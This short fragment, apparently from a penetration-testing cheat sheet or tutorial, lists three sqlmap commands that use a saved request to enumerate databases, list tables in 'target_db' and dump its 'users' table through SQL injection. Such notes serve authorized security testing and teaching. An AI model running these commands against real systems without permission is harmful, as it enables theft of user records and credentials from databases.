...
A.Get database names: sqlmap -r request.txt -p id --dbs

B.List tables: sqlmap -r request.txt -p id -D target_db --tables

C.Dump table data: sqlmap -r request.txt -p id -D target_db -T users --dump
